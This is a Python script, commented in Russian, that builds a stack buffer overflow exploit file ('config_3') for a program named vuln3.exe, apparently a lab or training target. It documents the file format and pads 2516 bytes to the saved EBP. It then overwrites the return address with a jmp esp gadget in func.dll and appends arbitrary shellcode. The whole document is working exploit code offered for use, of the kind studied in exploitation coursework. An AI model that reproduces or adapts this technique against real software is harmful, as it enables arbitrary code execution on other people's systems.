"""Сборка файла config_3 для vuln3.exe.

Формат config_3 (всё little-endian):

    +0   ...       54 байта  заголовок варианта (копируется из эталонного файла)
    +4             shell_len  - длина полезной нагрузки в байтах
    +8             dst_len    - размер буфера назначения (2500)
    +16            копия shell_len
    +20            копия dst_len
    +54            2516 байт 0xFF  - заполнение до сохранённого EBP
    +2570          jmp esp (0x62501297) - адрес возврата из func.dll
    +2574          сама полезная нагрузка

Итоговый размер = 54 + 2516 + 4 + len(shellcode).

Использование:
    python make_config.py payload_asm.bin config_3
"""
import struct
import sys

# заголовок варианта 3 (54 байта) - как в эталонном config_3
HEADER = bytes.fromhex(
    "030200f4" "5c020000" "c4090000" "00000000"
    "5c02c409" "08000000" "b86b3400" "b86b3400"
    "b36b3400" "00000000" "00008600" "00003400"
    "2f737461" "7274"
)
assert len(HEADER) == 54, len(HEADER)

PAD = 2516                                  # байт до сохранённого EBP
JMP = bytes.fromhex("97125062")             # jmp esp в func.dll (0x62501297)
DST_LEN = 2500


def build(code: bytes) -> bytes:
    h = bytearray(HEADER)
    sl = len(code)
    struct.pack_into('<I', h, 4, sl)        # shell_len
    struct.pack_into('<I', h, 8, DST_LEN)   # dst_len
    struct.pack_into('<I', h, 16, sl)       # копия shell_len
    struct.pack_into('<I', h, 20, DST_LEN)  # копия dst_len
    return bytes(h) + b'\xff' * PAD + JMP + code


if __name__ == '__main__':
    src = sys.argv[1] if len(sys.argv) > 1 else 'payload_asm.bin'
    dst = sys.argv[2] if len(sys.argv) > 2 else 'config_3'
    code = open(src, 'rb').read()
    cfg = build(code)
    open(dst, 'wb').write(cfg)
    print("payload : %d байт, нулей %d" % (len(code), code.count(0)))
    print("config_3: %d байт -> %s" % (len(cfg), dst))
